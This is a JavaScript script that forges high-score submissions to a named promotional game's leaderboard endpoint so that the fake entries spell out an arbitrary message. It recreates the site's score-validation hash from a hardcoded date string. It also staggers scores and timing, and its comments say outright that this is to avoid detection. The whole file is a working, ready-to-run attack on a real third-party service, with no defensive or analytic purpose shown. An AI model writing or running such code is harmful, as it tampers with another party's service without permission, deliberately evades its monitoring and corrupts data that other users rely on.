const url = 'https://cocainebear-game.films.apps.nbcuni.com/saveScore.php';
const CryptoJS = require('crypto-js');
const prompt = require('prompt-sync')({ sigint: true });

// Score starts low to avoid detection (yet still be above others)
const score = 20640;

async function sleep(millis) {
    return new Promise(resolve => setTimeout(resolve, millis));
}


// Function remains virtually the same except for the date string
function saveScore(name, score) {
    let release = CryptoJS.MD5(score + "02/27/22").toString();
    fetch(url, {
        "method": 'POST',
        "body": `name=${name}&score=${score}&release=${release}`,
        "headers": {
            "content-type": 'application/x-www-form-urlencoded; charset=UTF-8'
        }
    });
}

async function main() {
    text = prompt('Enter the sentence you want to show on the site: ');
    text = text.toUpperCase();
    text = text.split("").reverse().join("");
    const list = "ABCDEFGHIJKLMNPQRSTUVWXYZ";
    var counter = 0;
    for (let char of text) {

        // Timeout for 1 minute to avoid spamming the server
        await sleep(60000);

        // Notice the score was updated with the counter (to avoid detection)
        if (char != " "){
            saveScore(char + "I" + char, (score + counter).toString());
            console.log(`Sent ${char}`);
        }
        else {
            saveScore("LOL", (score + counter).toString());
            console.log('Sent space');
        }

        // Aforementioned counter
        counter+=20;
    }
}

main();